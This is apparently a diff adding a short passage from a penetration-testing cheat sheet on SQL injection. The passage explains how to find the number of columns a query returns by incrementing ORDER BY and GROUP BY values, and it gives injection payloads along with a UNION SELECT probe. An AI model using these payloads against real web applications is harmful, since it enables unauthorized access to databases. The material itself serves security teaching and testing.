@@ -1,1 +1,19 @@
+Detecting number of columns
+f you can see the output of the query this is the best way to exploit it.
+First of all, wee need to find out the number of columns the initial request is returning. This is because both queries must return the same number of columns.
 
+Two methods are typically used for this purpose:
+Order/Group by
+Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.
+
+1' ORDER BY 1--+    #True
+1' ORDER BY 2--+    #True
+1' ORDER BY 3--+    #True
+1' ORDER BY 4--+    #False - Query is only using 3 columns
+                        #-1' UNION SELECT 1,2,3--+    True
+                        
+1' GROUP BY 1--+    #True
+1' GROUP BY 2--+    #True
+1' GROUP BY 3--+    #True
+1' GROUP BY 4--+    #False - Query is only using 3 columns
+                        #-1' UNION SELECT 1,2,3--+    True                        
